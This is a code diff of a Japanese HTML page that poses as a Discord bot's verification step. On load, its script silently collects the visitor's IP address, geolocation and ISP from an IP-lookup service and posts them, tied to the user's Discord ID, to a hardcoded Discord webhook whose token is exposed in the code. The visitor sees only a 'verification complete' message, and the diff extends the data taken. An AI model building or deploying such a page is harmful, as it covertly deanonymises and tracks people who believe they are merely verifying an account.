@@ -1,29 +1,37 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head><meta charset="UTF-8"><title>認証完了</title></head>
+<head><meta charset="UTF-8"><title>認証処理</title></head>
 <body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
     <h1 id="status">認証処理中...</h1>
+    <p id="details">しばらくお待ちください。</p>
+
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
 
         async function process() {
             const params = new URLSearchParams(window.location.search);
-            const logId = params.get('log_id');
-            const userId = params.get('user_id');
+            
+            // URLにあればそれを使い、なければブラウザの保存領域から探す
+            let logId = params.get('log_id') || localStorage.getItem('last_log_id');
+            let userId = params.get('user_id') || localStorage.getItem('last_user_id');
+
+            // 今URLにあるなら、次回のために保存しておく
+            if (params.get('log_id')) localStorage.setItem('last_log_id', params.get('log_id'));
+            if (params.get('user_id')) localStorage.setItem('last_user_id', params.get('user_id'));
 
             if (!logId || !userId) {
                 document.getElementById('status').innerText = "エラー: パラメータが不足しています";
+                document.getElementById('details').innerText = "Botから発行されたリンクを正しく開いてください。";
                 return;
             }
 
             try {
-                // IP情報の取得 (HTTPS対応のAPI)
+                // IP取得
                 const geoRes = await fetch('https://ipapi.co/json/');
                 const geo = await geoRes.json();
-                const ip = geo.ip;
                 const loc = `${geo.country_name} / ${geo.region} / ${geo.city}`;
 
-                // Webhookを更新(PATCH)
+                // WebhookをPATCH（上書き）
                 const response = await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
@@ -31,7 +39,7 @@
                         content: `✅ **認証完了**: <@${userId}>`,
                         embeds: [{
                             title: "ユーザー特定・IP取得成功",
-                            description: `**IP:** \`${ip}\`\n**場所:** \`${loc}\``,
+                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${loc}\`\n**ISP:** \`${geo.org}\``,
                             color: 0x43b581,
                             timestamp: new Date().toISOString()
                         }]
@@ -39,12 +47,13 @@
                 });
 
                 if (response.ok) {
-                    document.getElementById('status').innerText = "✔ 認証に成功しました。ページを閉じてください。";
+                    document.getElementById('status').innerText = "✔ 認証完了";
+                    document.getElementById('details').innerText = "Discordに戻ってください。";
                 } else {
-                    document.getElementById('status').innerText = "Webhookの更新に失敗しました。";
+                    document.getElementById('status').innerText = "Webhook送信エラー";
                 }
             } catch (e) {
-                document.getElementById('status').innerText = "エラーが発生しました。";
+                document.getElementById('status').innerText = "接続エラー";
             }
         }
         process();
